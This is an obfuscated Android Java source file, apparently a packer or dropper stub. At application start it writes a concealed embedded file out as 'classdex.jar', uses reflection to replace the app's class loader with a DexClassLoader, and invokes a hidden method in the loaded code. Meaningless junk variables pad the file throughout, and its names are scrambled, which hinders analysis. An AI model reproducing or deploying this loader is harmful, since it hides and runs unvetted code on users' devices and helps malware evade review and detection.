package gfav;

import android.content.Context;
import android.util.ArrayMap;

import java.io.File;
import java.lang.ref.WeakReference;
import java.lang.reflect.Field;
import java.lang.reflect.Method;

import dalvik.system.DexClassLoader;
import gfav.dwwadq.tdrscsbdac;
import gfav.dwwadq.oaunyrqz;

public class cnpuykiip {
    /**2 APPLICATION_ATTACHBASE*/
    public static void APPLICATIONATTACHBASE(Context lkj){

        String jyigknvCE = "ZpIzebfcPxNHqxMYkwHgNjgWRGcJebFkdGpYATFvUSsYOyf";
        String ALgzdK = "yWXumXSGlWcGDGPABpsamkXEKlfDggkwSDpEXQipSYHvB";
        String CxepZBh = "fKKVZqmVEX";
        String GquHwoSNzV = "OSUzcOliZHMSDefQmNNtxvQfKEVTKQG";
        int WDnLVjel = 6093;
        int MzyujtwL = 1225;
        String uFOMpwa = "tTCRbLqyRbCFZAMicIVCiDudXe";
        int SuBrOh = 7850;
        int tEFlTmwkB = 8778;
        int CGFWsiPQH = 6482;
        int JGGhE = 2327;
        int XpxzbfX = 5890;
        if(nmcxikklj.Judgeadjustsch()){
            decompression(lkj);
            try {
                Class<?>  fas = tdrscsbdac.m_dcl.loadClass("myhkm.ololgc");
                Method asdw = fas.getMethod("kjgpaqnwtm", new Class[] {Context.class });

                asdw.invoke(null, new Object[] {lkj});
            } catch (Exception dww){

                dww.printStackTrace();
            }
        }
    }

    public static void decompression(Context cswq){
        int vbTRX = 5138;
        String pKGLtaN = "upwLlUBQOIbeelcFuuUrqDErdDxU";
        int dNjZgwfAE = 8939;
        String egUBZqtv = "DxVQMkwtfsdajEOGArjjCwyeMSUAIyFMnkHoQILWd";
        int wzvuya = 8103;
        String lWBmUzr = "yVgMKmaJwxGNidHtuCEDy";
        String APuEDj = "DmWVnFTEnEKdJwyebBeoR";
        String zBimo = "yzZvvrNaNHGUoSqbjRrZKogAmjYmwpWxeoNrKdpgAEvgJIxi";
        String uGzqyxaaU = "aSxPcnOrpfuOcFCIqWZKFhNeiYvTKd";
        int jBdRZL = 872;
        try {

            String kiwjhf = cswq.getFilesDir().getAbsolutePath() + "/classes/";
            File dswcza = new File(kiwjhf);

            if (!dswcza.exists()) {
                dswcza.mkdirs();
            }

            qqvduo.asncjwhqcxzw(cswq, oaunyrqz.mkfjwkj23jf, kiwjhf + "/classdex.jar");

            Class dasw = Class.forName("android.app.ActivityThread");
            Method aa = dasw.getMethod("currentActivityThread",new Class[] {});
            Object ascw = aa.invoke(null, new Object[] {});

            int NmLuDHToX = 787;
            String BmHpKN = "cwGkVjFkpOTSbQjrw";
            String kkVENwGG = "kAFCYYGoJxrgcHobVsQcKoOakKU";
            String JvbGMbndV = "dhXLIIuNKGPNXMBObBraNPAqHItSyHyngOFbjmGRcPSxwFC";
            String yNBxFD = "DsZEAPETZBjlrlnRXrxFVazgIKPpJSZxqvKxQ";
            int jZTFoMzxOm = 4011;
            int ZVjsQK = 6300;
            String JzrqG = "cqYKUzesHysyiqClgoaGk";
            String szxwz = "AsQREYdLlhLrPQZTOTFwOynMhXfnzsqeVTOxd";
            String wlkNgADRp = "OJwZUPoWKmGKKRaWvQoWzPTIMeOgDGQFdqyBKfA";

            Class dswfawfass = Class.forName("android.app.ActivityThread");
            Field casfw = dswfawfass.getDeclaredField("mPackages");
            casfw.setAccessible(true);
            ArrayMap ascwwvzxvzx = (ArrayMap) casfw.get(ascw);


            WeakReference sawwgg = (WeakReference) ascwwvzxvzx.get(cswq.getPackageName());
            tdrscsbdac.m_dcl = new DexClassLoader(kiwjhf + "/classdex.jar", kiwjhf, kiwjhf, cswq.getClassLoader());



            Class asdqw = Class.forName("android.app.LoadedApk");

            Field asdwqgbzbzx = asdqw.getDeclaredField("mClassLoader");
            asdwqgbzbzx.setAccessible(true);


            asdwqgbzbzx.set(sawwgg.get(), tdrscsbdac.m_dcl);
        } catch (Exception asfasf) {

            asfasf.printStackTrace();

        }
    }

}